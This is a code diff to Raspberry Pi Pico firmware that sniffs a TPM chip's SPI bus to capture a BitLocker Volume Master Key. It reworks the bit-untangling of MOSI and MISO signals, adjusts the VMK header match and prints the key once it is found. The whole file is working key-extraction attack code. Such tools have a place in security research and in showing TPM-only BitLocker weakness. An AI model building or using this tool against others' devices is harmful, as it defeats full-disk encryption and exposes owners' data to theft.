@@ -10,9 +10,10 @@
 
 // Our assembled program:
 #include "spi_sniffer.pio.h"
-
-
 #include "hardware/flash.h"
+
+#define JMP_PIN 5
+#define BASE_PIN 2
 
 unsigned char reverse(unsigned char b) {
    b = (b & 0xF0) >> 4 | (b & 0x0F) << 4;
@@ -40,34 +41,48 @@ enum state {
 
 static inline uint32_t fetch(PIO pio, uint sm) {
     uint32_t result_raw = pio_sm_get_blocking(pio, sm);
-    //uint32_t result = fix_bit_format(result_raw); // i dont know why this is actually needed
-    return result_raw;
+    uint32_t result = fix_bit_format(result_raw); // i dont know why this is actually needed
+    return result;
 }
 
-static inline uint8_t fetch_data(PIO pio, uint sm) {
-    char data, data1, data2, data3, data4;
 
-    // looking for the signature 0x80000001 before the 
-    // actual data byte from the TPM chip response (SO)
-    // return the data byte only, skip everything else
-    while (1) {
-	data1 = (char) (pio_sm_get_blocking(pio, sm) );
-	if (data1 != 0x80) continue;
-	data2 = (char) (pio_sm_get_blocking(pio, sm));
-	if (data2 != 0x00) continue;
-	data3 = (char) (pio_sm_get_blocking(pio, sm));
-	if (data3 != 0x00) continue;
-	data4 = (char) (pio_sm_get_blocking(pio, sm));
-	if (data4 != 0x01) continue;
-
-	data = (char) pio_sm_get_blocking(pio,sm);
-	break;
+static inline uint8_t fetch_message(PIO pio, uint sm) {
+    uint64_t mosi_msg=0x0;
+    uint64_t miso_msg=0x0;
+    uint32_t data;
+    bool init = true;
+    //printf("[fetch_message] \n");
+    while(1)
+    {
+        char miso_byte = 0x0;
+        char mosi_byte = 0x0;
+        uint16_t mosi_msk = 0b0100000000000000;
+        uint16_t miso_msk = 0b1000000000000000; 
+        data = fetch(pio, sm);//( pio_sm_get_blocking(pio, sm) );
+        // untangle DO and DI parts
+        for (int i = 0; i < 8 ; i++)
+        {   
+            miso_byte = miso_byte | ((char) ((data & miso_msk) >> (8-i))) ;
+            mosi_byte = mosi_byte | ((char) ((data & mosi_msk) >> (7-i))) ;
+            miso_msk = miso_msk >> 2;
+            mosi_msk = mosi_msk >> 2;
+        }
+        if (init) {
+            mosi_msg = mosi_msg | mosi_byte;
+            miso_msg = miso_msg | miso_byte;    
+        }else{
+            mosi_msg = (mosi_msg << 8) | mosi_byte;
+            miso_msg = (miso_msg << 8) | miso_byte;
+        }
+        init = false;
+        if (!((mosi_msg & 0x00000000ff00ff00) == 0x00D4002400)) continue;
+        char message = (char) (miso_msg & 0xff);
+        return message;
     }
-    return data;
 }
 
-static const char vmk_header[] = {
-    0x2c, 0x00, 0x00, 0x0, 0x01, 0x00, 0x00, 0x00, 0x03, 0x20, 0x00, 0x00
+static const char vmk_header[] = {//0x2c, 0x00, 0x00, 0x0, 0x01, 0x00, 0x00, 0x00, 0x03, 0x20, 0x00, 0x00
+    0x2c, 0x00, 0x05, 0x0, 0x01, 0x00, 0x00, 0x00, 0x03, 0x20, 0x00, 0x00
 };
 
 #define MAXCOUNT 512
@@ -79,26 +94,20 @@ volatile size_t msg_buffer_ptr = 0;
 bool byte_found = false;
 
 void core1_entry() {
-    // 12 byte header + 32 byte data
-    char msg_buffer[12 + 32];
-    memset(msg_buffer, 0, 44);
-
     PIO pio = pio0;
     uint offset = pio_add_program(pio, &spi_sniffer_program);
     uint sm = pio_claim_unused_sm(pio, true);
-    spi_sniffer_program_init(pio, sm, offset, 2, 4);
-    // pin 4 is SCK and JMP PIN 
-    size_t bufpos = 0;
+    spi_sniffer_program_init(pio, sm, offset, BASE_PIN, JMP_PIN);
+    
     while(1) {
-        char message = fetch_data(pio, sm);
-	if (message == 0x2c){
-	    multicore_fifo_push_blocking(msg_buffer_ptr+1);
-	    for (int i = 0; i < 44; i++){
-	    	message_buffer[msg_buffer_ptr++] = message;
-		message = fetch_data(pio, sm);
-	    }
-	    message_buffer[msg_buffer_ptr++] = message;
-	}
+        char message = fetch_message(pio, sm);
+        if (!(message == 0x2c)) continue;
+	    //printf("[VMK header ...]\n");
+        message_buffer[msg_buffer_ptr++] = message;
+        multicore_fifo_push_blocking(msg_buffer_ptr);
+        for (int i = 0 ; i < 44; i++) {
+            message_buffer[msg_buffer_ptr++] = fetch_message(pio, sm);
+        }
     }
 }
 
@@ -123,16 +132,18 @@ int main() {
     puts("");
     
     printf("[+] Ready to sniff!\n");
-
+    float f = (float) clock_get_hz(clk_sys);
+    printf("[+] %f \n",f);
+    
     multicore_launch_core1(core1_entry);
 
     while(1) {
         uint32_t popped = multicore_fifo_pop_blocking();
-	//printf("[%d, %d]\n",popped,byte_found);
+	    //printf("[%d, %d]\n",popped,byte_found);
         // Wait til the msg_buffer_ptr is full
         while((msg_buffer_ptr - popped) < 44) {
         }
-        if(memcmp(message_buffer + popped, vmk_header, 5) == 0) {
+        if(memcmp(message_buffer + popped, vmk_header, 12) == 0) {
             printf("[+] Bitlocker Volume Master Key found:\n");
 	    printf("[+] VMK Header: ");
 	    for (int i = 0; i < 12; i++)
